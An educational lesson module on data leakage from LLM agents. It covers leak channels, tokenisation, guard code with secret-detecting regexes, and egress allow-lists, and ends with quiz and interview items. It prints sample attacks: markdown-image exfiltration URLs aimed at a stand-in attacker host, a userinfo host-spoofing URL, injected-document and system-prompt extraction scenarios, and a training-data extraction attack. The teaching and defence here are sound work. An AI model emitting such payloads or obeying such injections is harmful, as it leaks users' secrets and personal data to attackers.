---
id: data-leakage
module: safety-security
name: Data leakage
kind: concept
difficulty: core
est_minutes: 17
status: agentic-verified
agent_relevance: core
related:
  - safety-security/pii-redaction
  - safety-security/cross-tenant-data-leakage
  - safety-security/prompt-injection
  - security-governance-compliance/pii-protection-dlp
  - security-governance-compliance/data-classification
  - ml-fundamentals/train-test-leakage
  - observability/logging
  - agent-runtime-architecture/secrets-and-credential-isolation
sources:
  - Carlini et al., 2021 — Extracting Training Data from Large Language Models
  - Nasr et al., 2023 — Scalable Extraction of Training Data from (Production) Language Models
  - Morris et al., 2023 — Text Embeddings Reveal (Almost) As Much As Text
  - Official docs: OWASP Top 10 for LLM Applications
---

## TL;DR
In an agent, data leaks where information crosses a boundary it should not: to a provider, another
user, model weights, a tool call or a rendered link. Minimise what enters the prompt, control what tools
can send, and assume no boundary exists inside the context.

## For agent builders
- **Why it matters for agents.** Your agent concatenates user input, retrieved documents, memory and tool
  results into one context and then acts on it. Anything in that context can come back out in a
  completion, a tool argument, a trace or a rendered image URL, and the model has no notion of
  confidentiality.
- **Where it shows up in your stack.** The prompt builder, tool dispatcher, the tracing SDK of your agent
  framework, your chat client's markdown renderer, embeddings and caches, and any fine-tuning job on agent
  transcripts.
- **What you control.** Field classification and tokenisation before the prompt, an output and tool-call
  guard in the loop, an egress allow-list, no remote image rendering, trace redaction before export, and
  canary tokens.
- **What you can skip.** Hoping "keep this secret" in the system prompt works, and building ever-wider
  regexes. Spend effort on prevention and containment, which do not depend on recognising the data.

## Why it exists
- **It is not ML train/test leakage.** It is information escaping: into a third-party API, another user's
  answer, model weights, or out through a tool call or rendered link.
- **Conventional data flows are enumerable.** Request, handler, database, response, each with a schema, so a
  privacy review can draw the diagram and sign it.
- **An LLM app or agent dissolves that.** It concatenates many sources into one free-text prompt, sends it
  to a model often hosted by someone else, stores prompt and completion in an observability tool by
  default, derives embeddings stored elsewhere, and emits output that may contain any of it in any order.
  The model has no notion that one part of its context is confidential.
- **Three naive answers each cover a sliver.**
  - *"The provider does not train on API data"*: retention windows, subprocessors and abuse-monitoring
    logs still exist, and your own trace store, readable by every engineer, is usually the larger exposure.
  - *"Tell the model to keep the system prompt secret"*: extraction is a routine jailbreak, so any secret or
    authority there is already public; OWASP lists system prompt leakage as its own item for that reason.
  - *"We redact PII"*: API keys, contract terms, unreleased financials and other users' messages are not
    PII and sail through.
- **You need a map of every channel,** because the one you did not draw is the one that leaks.

## How it works
### The channel map
| Channel | What leaks | Primary controls |
|---|---|---|
| **Channel 1: inbound to the provider** | everything in the prompt leaves your boundary | data-processing agreement, zero-retention or regional endpoints where offered, above all minimisation |
| **Channel 2: outbound in the completion** | system prompt, retrieved documents, other participants' messages in a shared thread, secrets in tool results | nothing secret or authority-bearing in the prompt; output DLP; canaries |
| **Channel 3: tools and rendering** | data POSTed anywhere an injected instruction names; silent image GETs | no remote images, egress allow-lists, taint-based tool restriction |
| **Channel 4: observability and logs** | a second copy of your most sensitive data with weaker access control | redact before export, field-level access, retention in days |
| **Channel 5: memorisation in weights** | verbatim training data, extractable | retrieval over fine-tuning, deduplication, extraction probes |
| **Channel 6: embeddings** | most of the original text, via inversion | same classification and access control as the source |
| **Channel 7: caches and memory** | one person's data returned to another | key must include the principal |
| **Channel 8: people and unsanctioned tools** | code, contracts, exports pasted into consumer chatbots | a sanctioned tool that is as convenient |

### Channels 1-2: what enters and what comes back
1. **Classify fields before they reach the prompt builder** and strip what the task does not need.
2. **Tokenise identifiers the model need not understand:** replace the account number with an opaque
   placeholder, run the model, re-hydrate on the way out. The model never sees the real value, so no
   downstream channel can leak it.
3. **Design the prompt so nothing in it is secret or authority-bearing;** authorization lives server-side,
   because the model repeats its context.
4. **Scan completions with output DLP:** regex for high-precision secret formats (cloud access keys, private
   key headers, JWTs), NER for personal data, and canary tokens planted in confidential documents so
   verbatim regurgitation is detectable.

### Channel 3: exfiltration through tools and rendering
- **Network tools:** an agent can POST data anywhere an injected instruction names.
- **Silent rendering:** a completion containing `![](https://attacker.example/?d=<secret>)` is rendered as an
  image, and the browser issues the GET carrying whatever the model put in the query string. No tool
  call, no user click.
- **Controls:** do not render remote images from model output, or proxy them through an allow-list;
  restrict egress hosts for tools; disable outbound tools once untrusted content has entered the context.

### Channel 4: observability and logs
- **The default is dangerous:** tracing SDKs capture full prompts and completions, ship them to a SaaS
  backend and keep them indefinitely. Agent traces are worse, because every tool result is captured too.
- **Controls:** redact at the SDK layer before export, apply field-level access, set retention measured in
  days, and give the trace store the classification of the most sensitive thing passing through it.

### Channel 5: memorisation in weights
- **Extraction is practical.** Carlini et al. recovered verbatim sequences from GPT-2 in 2021; Nasr et al. in
  2023 extracted training data from production chat models by pushing them to diverge from their
  fine-tuned behaviour (the "repeat this word forever" attack).
- **Memorisation rises with duplication and model scale.**
- **Prefer retrieval over fine-tuning for per-customer data,** because a document in a store can be filtered
  and deleted while an example in the weights cannot.
- **If you must train (for example on agent transcripts):** deduplicate aggressively, exclude raw secrets
  and identifiers, and test with membership-inference and extraction probes. Differentially private
  training exists but costs significant utility.

### Channels 6-8: embeddings, caches, people
- **Embeddings are not anonymisation.** Inversion recovers most of the original text from a sentence
  embedding (Morris et al., 2023). Encrypt the vector store at rest, give it the source's classification
  and access control, and never ship embeddings of confidential text to a less trusted system as "just
  numbers".
- **Caches and memory keyed without the user or tenant** return one person's data to another; the
  cross-tenant lesson covers the mechanics. The key must include the principal.
- **People need no attacker.** An employee pastes source code, a contract or a customer export into a
  consumer chatbot under a personal account, outside any data-processing agreement. It was widely reported
  in 2023 that engineers at a large electronics maker did exactly this with internal code.
- **Technical controls for people are blunt** (egress proxies, browser DLP); the effective one is a
  sanctioned tool that is as convenient, because people route around bans.

### Ordering the controls: prevent, contain, detect
Put the weight on controls that do not need to recognise the data.

| Order | Controls | Why it is ranked here |
|---|---|---|
| 1. **Prevention** | minimisation, tokenisation, not training on it | works on data that never entered |
| 2. **Containment** | egress allow-lists, no remote image rendering, scoped stores | works whatever the model writes, because it limits where bytes go rather than inspecting them |
| 3. **Detection** | output DLP, canaries | defeatable: base64-encoding a key, splitting it across words or translating a paragraph beats a pattern match |

- **Containment beats encoding tricks:** a model cannot defeat an egress allow-list that has no route to the
  attacker.
- **Detection still earns its place for accidental leaks,** which are not adversarial and so keep their
  recognisable format.

## Diagram
Follow sensitive data through one agent step to every place it can land; prevention acts before the
prompt, containment at the edges, detection last.

```mermaid
flowchart TD
    S[("Source data")] --> P["Minimise + tokenise"]
    P --> B["Prompt builder"]
    B --> PR["Provider model"]
    B --> TR[("Traces: redact before export")]
    B --> E[("Embeddings + caches")]
    PR --> O["Completion"]
    O --> G["Output guard: DLP, canaries"]
    G --> R["Client render: no remote images"]
    G --> T["Tool call"]
    T --> A{"Host on egress allow-list?"}
    A -->|"no"| X["Blocked"]
    A -->|"yes"| H["Host you control"]
```

## Examples
### An output and tool-call guard for the agent loop
Runs on every completion and every tool call before execution. It blocks known secret formats and planted
canaries, strips remote markdown images (the silent-GET channel), and refuses tool arguments that would
contact a host outside the allow-list. It is deliberately high-precision: it will not catch everything,
but what it catches it catches reliably.

```python
import re

SECRET_PATTERNS = {
    "aws_access_key": re.compile(r"\bAKIA[0-9A-Z]{16}\b"),
    "jwt":            re.compile(r"\beyJ[\w-]{10,}\.[\w-]{10,}\.[\w-]{10,}\b"),
    "private_key":    re.compile(r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----"),
}
CANARY = re.compile(r"CANARY-[a-z]+-[0-9a-f]{4}")            # planted in confidential documents
REMOTE_IMG = re.compile(r"!\[[^\]]*\]\((https?://[^)]+)\)")    # markdown image => silent GET
HTML_IMG = re.compile(r"<img\b[^>]*>", re.I)                   # same channel if HTML is rendered
ALLOWED_EGRESS = {"api.internal.example", "docs.example.com"}

class LeakBlocked(Exception):
    pass

def scan_text(text: str, where: str) -> None:
    for name, pat in SECRET_PATTERNS.items():
        if pat.search(text):
            raise LeakBlocked(f"{name} found in {where}")
    if CANARY.search(text):
        raise LeakBlocked(f"confidential canary token found in {where}")

def guard_completion(text: str) -> str:
    scan_text(text, "model output")
    # the client would fetch this URL and leak whatever sits in its query string
    text = HTML_IMG.sub("[image removed]", text)
    return REMOTE_IMG.sub(lambda m: f"[image removed: {m.group(1).split('?')[0]}]", text)

def guard_tool_call(name: str, args: dict) -> None:
    flat = " ".join(str(v) for v in args.values())
    scan_text(flat, f"arguments of {name}")
    for host in re.findall(r"https?://([^/\s?#]+)", flat):
        host = host.lower().rsplit("@", 1)[-1].split(":")[0]  # drop userinfo and port
        if host not in ALLOWED_EGRESS:
            raise LeakBlocked(f"{name} would contact non-allow-listed host {host}")

# inside the agent loop:
#   text = guard_completion(llm_text)
#   guard_tool_call(call.name, call.args); then execute the call
```

- **On a block,** return the `LeakBlocked` message to the model as the tool result and log the call with
  the context items that preceded it, so you can find the injection source later.

### Tracing attacks through the guard
| Attack | What the guard does | Result |
|---|---|---|
| Injected document makes the model write `![s](https://x.example/p.png?d=jane@corp.example)` | `guard_completion` rewrites it to `[image removed: https://x.example/p.png]` | client never issues the GET; the query string never leaves |
| Agent calls `fetch_url(url="https://docs.example.com@x.example/")` | userinfo is dropped, so the real host `x.example` is exposed | allow-list rejects it |
| Raw AWS key (for example AWS's documented sample `AKIAIOSFODNN7EXAMPLE`) in a tool argument | secret pattern matches | blocked |
| Model base64-encodes an AWS key into an argument to an allow-listed host | secret pattern misses it | only saved because the allow-listed host is one you control |

- **That last row is prevent-contain-detect in miniature.** Pair the guard with the inbound side
  (minimisation and tokenisation before the prompt is built, redaction in the tracing SDK), so it is the
  last line rather than the only one.

### Tokenising identifiers before the prompt
The model sees placeholders; real values come back only on the way out, for example inside the tool
dispatcher that files the dispute. Pure Python, runnable.

```python
import re, secrets

ACCOUNT = re.compile(r"\b\d{8,12}\b")          # this app's account-number format

def tokenise(text: str) -> tuple[str, dict]:
    vault = {}
    def swap(m):
        ph = f"<ACCT_{secrets.token_hex(3)}>"
        vault[ph] = m.group(0)
        return ph
    return ACCOUNT.sub(swap, text), vault

def rehydrate(text: str, vault: dict) -> str:
    for ph, real in vault.items():
        text = text.replace(ph, real)
    return text

prompt, vault = tokenise("Customer disputes a charge on account 40021187 and 77310045.")
print(prompt)                                    # the model only ever sees placeholders
reply = f"Opened a dispute for {list(vault)[0]}." # stand-in for the model's answer
print(rehydrate(reply, vault))                   # real value restored on the way out
```

- **Keep the vault per request and server-side;** it is the only place the real values live, so it must
  not be logged with the trace.
- **Re-hydrate inside tools, not in the context:** the agent passes `<ACCT_…>` placeholders as tool
  arguments and the tool swaps in the real value, so the account number never enters the transcript.

## Production patterns
- **Field classification at the prompt builder.** Tag each field that can enter a prompt (public, internal,
  confidential, restricted) and have the builder drop or tokenise anything above the route's allowed
  level. Monitor the share of prompt fields that are classified.
- **Redaction in the tracing pipeline.** Mask or drop prompt, completion and tool-result bodies before
  export (an SDK-side processor or the collector's attribute-processing step), restrict raw-body access to
  a small group, and set retention measured in days. Monitor trace redaction coverage on sampled spans.
- **Markdown sanitisation in the client.** Render model output with remote images disabled or proxied
  through an allow-listed image proxy, and apply a Content-Security-Policy `img-src` that excludes
  arbitrary hosts. Monitor CSP violation reports, which flag exfiltration attempts.
- **Egress proxy for agent tools.** Send all tool HTTP through a forward proxy with a host allow-list, and
  never allow-list hosts that store or reflect content. Monitor blocked-egress events per tool.
- **Canary documents in confidential corpora.** Plant unique tokens in sensitive documents and alert when
  one appears in any completion, trace or outbound request. Monitor canary hits as a sev-1 signal.
- **A sanctioned internal assistant.** Offer an approved chat tool under a data-processing agreement so
  employees stop pasting into consumer accounts. Track adoption and blocked consumer-chatbot traffic.

## Trade-offs
- **Minimisation and tokenisation vs reasoning.** They remove whole classes of leakage, but every stripped
  field is one the model cannot reason about. When the task needs the raw value, move the control to the
  output and egress side instead.
- **Zero-retention endpoints vs features.** They shrink inbound exposure but can disable provider-side
  features such as abuse monitoring or caching, and do nothing about your own logs.
- **High-precision DLP vs coverage.** It rarely blocks legitimate answers but misses paraphrased or partially
  quoted secrets. Widening patterns raises false positives until users route around the guard, so tune it
  on a sample of real completions.
- **Egress allow-lists vs open browsing.** They stop exfiltration regardless of encoding but break
  open-ended browsing agents. Split the work so the browsing agent holds no private data and the agent with
  private data has no open egress, instead of loosening the list.
- **Retrieval vs fine-tuning.** Retrieval keeps customer data deletable and filterable, at the cost of
  retrieval engineering and prompt tokens on every call. Fine-tuning is only the right trade when the data
  is not sensitive or is fully synthetic.

## Pitfalls
- **Authorization or secrets in the system prompt** ("you may only access accounts of user 1234"). Symptom:
  a jailbreak prints the prompt and a customer now knows the trick.
- **Tracing SDK left on full capture.** Symptom: a privacy review discovers a third-party dashboard with
  months of customer conversations and tool results.
- **Rendering remote images from model output.** Symptom: outbound requests to unfamiliar hosts with
  suspiciously long query strings in the client's network log.
- **Treating embeddings as safe to share** with a lower-trust vendor or region. Symptom: a data-residency
  finding when someone asks where the vectors live.
- **Allow-listing a host that stores or reflects input** (a shared bucket, a public paste or issue tracker,
  an endpoint with an open redirect). Symptom: zero blocked-egress events while data still turns up
  outside, because the attacker reads it from the allowed host.
- **Fine-tuning on raw support tickets, testing only task accuracy.** Symptom: the model emits a real
  customer's name and order details when prompted with a similar ticket.

## When to use
- **Use when:** data classified above "public" touches an LLM path: a new integration, tracing vendor, agent
  tool or fine-tune. Run the channel map each time.
- **Reach first for** minimisation and tokenisation, because preventing entry is cheaper than detecting
  exit; then egress controls and output DLP; treat training on sensitive data as the last resort.
- **Measure:** the share of prompt fields that are classified, trace redaction coverage, egress allow-list
  violations blocked, and canary hits in outputs.
- **Interviews:** "what are all the ways customer data could leave this system?" A strong answer enumerates
  provider, completion, tools and rendering, logs, weights, embeddings and caches, not just PII redaction.

## Role lens
- **Engineer:** Builds the prompt with classified, minimised fields, configures trace redaction, and wires
  output and tool-call guards into the agent loop with tests for each channel.
- **Architect:** Owns the data-flow map and classification policy for derived stores, chooses provider
  terms and regions, and decides where retrieval must replace fine-tuning for sensitive data.
- **FDE:** Answers the customer's "where does our data go?" with the channel map, and configures per-customer
  redaction, egress allow-lists and retention to match their security review.

## Check yourself
**Q:** A customer asks whether, from a privacy standpoint, it is safer to fine-tune a shared model on their
support tickets or to use retrieval over the same tickets. Walk through the leakage channels in each and
make a recommendation.

**A:** Fine-tuning moves the tickets into the weights. The channels are then memorisation and extraction,
which cannot be filtered per user, cannot be audited per query, and cannot honour a deletion request
without retraining; a shared model also makes the weights a cross-tenant store. Mitigations such as
deduplication and differential privacy reduce but do not eliminate the risk and cost accuracy. Retrieval
keeps the tickets in a store you control: the channels are the vector index, the retrieved chunks entering
the prompt and the traces, all of which can be tenant-filtered, access-controlled, redacted and deleted.
It still sends chunks to the provider per request, so minimisation and provider terms matter, and
embeddings must be treated as sensitive because they are invertible. The recommendation is retrieval with
pre-applied tenant filters, redaction of identifiers before embedding, trace redaction, and a short
retention policy; fine-tune only on synthetic or de-identified examples if the task truly needs style or
format adaptation.

## Interview questions
### Walk me through every channel by which customer data could leave an LLM application.
- **Inbound and outbound:** the provider receives the whole prompt; the completion can repeat the system
  prompt, retrieved documents or tool results.
- **Side doors:** tool calls and rendered images, traces and logs, memorised weights, invertible embeddings,
  caches and memory keyed without the principal.
- **People:** employees pasting data into unsanctioned consumer tools.

### A security review finds outbound requests with long query strings to unknown hosts from your chat client. What happened?
- **Likely markdown-image exfiltration:** an injected instruction made the model emit a remote image whose
  URL carries data, and the client fetched it with no tool call or click.
- **Fix:** stop rendering remote images or proxy them through an allow-list, add a CSP `img-src` policy,
  and strip images in the output guard.
- **Then** find the injection source in traces and check what data was in that context.

### Where in an agent loop do you put leak controls, and why there?
- **Before the prompt:** classify and tokenise fields in the prompt builder, so the model and every
  downstream copy only see placeholders.
- **Between proposal and execution:** run the tool-call guard and egress allow-list on structured arguments
  before the dispatcher executes anything.
- **Before display and export:** sanitise completions in the client and redact traces in the SDK, because
  those are separate channels the loop itself never sees.

### Why rank prevention and containment above detection?
- **Detection must recognise the data,** and a model told to base64-encode, split or translate a secret
  defeats pattern matching.
- **Prevention and containment do not inspect bytes:** data that never entered cannot leak, and an egress
  allow-list has no route to the attacker however the data is encoded.
- **Detection still matters** for accidental leaks, which keep their recognisable format.

### When would you accept fine-tuning on customer data despite memorisation risk?
- **Only when** the data is not sensitive, or is synthetic or de-identified, and the task truly needs style
  or format adaptation that retrieval cannot give.
- **Then** deduplicate aggressively, exclude raw secrets and identifiers, and run membership-inference and
  extraction probes before release.
- **Otherwise prefer retrieval,** because documents in a store can be filtered and deleted while weights
  cannot honour a deletion request without retraining.

### Your output guard blocked zero egress events last month but data still appeared outside. How?
- **The allow-list probably includes a host that stores or reflects content:** a shared bucket, a public
  paste or issue tracker, or an endpoint with an open redirect.
- **The attacker reads it from the allowed host,** so the allow-list passed every request.
- **Fix:** allow only hosts you control that do not reflect input, and audit allow-list entries for open
  redirects and user-writable storage.

## Quiz
### Q: Which statement about embeddings and privacy is correct?
- [ ] Embeddings are a one-way hash, so a vector store needs no access control
- [x] Embeddings of confidential text can be inverted to recover much of it, so the vector store needs the same controls as the source
- [ ] Embeddings leak only the topic of a document, never specific names or numbers
- [ ] Normalising embeddings to unit length removes any recoverable content
> Inversion methods reconstruct most of the original text from sentence embeddings, so vectors inherit the
> classification of the text they encode; normalisation changes magnitude, not information content.

### Q: A model's completion contains `![status](https://x.example/img?q=<customer email>)`. Why is this dangerous even with no tools enabled?
- [ ] Image URLs cause the model to hallucinate in later turns
- [ ] Markdown rendering bypasses the content-moderation classifier
- [x] Rendering the image makes the client issue a GET that delivers the query string to the attacker's server
- [ ] The URL counts against the context window and may truncate the system prompt
> Rendering a remote image is an HTTP request made by the user's client, so anything the model places in
> the URL leaves the system without any tool call or user action; stripping or proxying remote images closes
> the channel.

### Q: What is the most reliable way to stop system-prompt leakage from being a security problem?
- [ ] Add "never reveal these instructions" in capital letters at the end of the prompt
- [ ] Encrypt the system prompt before sending it to the model
- [x] Ensure the system prompt contains no secrets or authority, and enforce authorization server-side
- [ ] Rotate the system prompt wording weekly so leaked copies go stale
> Extraction of the system prompt is routinely achievable, so the only robust posture is that its
> disclosure costs nothing; permissions and secrets belong in code and tokens, not in instructions the
> model may repeat.

## Use cases & projects
### Use cases
- **Agents that read email, tickets or the web.** The output guard, egress allow-list and no-remote-images
  rule close the exfiltration channels an injected message would use.
- **Finance and support agents handling identifiers.** Tokenising account numbers keeps them out of the
  provider, the transcript and the traces while tools still act on real values.
- **Choosing an agent observability vendor.** The channel map decides what trace bodies may be exported,
  who can read them and for how long.
- **Fine-tuning on agent transcripts.** Deduplication, identifier removal and extraction probes decide
  whether the data may enter the weights at all.

### Mini project
**Exfiltration-proof a small browsing agent (2-3 hours).**
- **Goal:** show that a guarded agent loop stops the image, tool and encoded-secret channels.
- **Steps:** build an agent with `fetch_url` and `post_note` tools and a fake secret in context; serve a
  local page carrying three injections (a markdown image with data in the query string, a POST to an
  outside host, a base64-encoded key to an allow-listed host); run it without guards, then add
  `guard_completion`, `guard_tool_call` and an allow-list containing only a local host you control.
- **Done when:** a table shows which injections leaked before and after, the image and outside-host
  attacks are blocked, and you can explain why the encoded key was contained rather than detected.
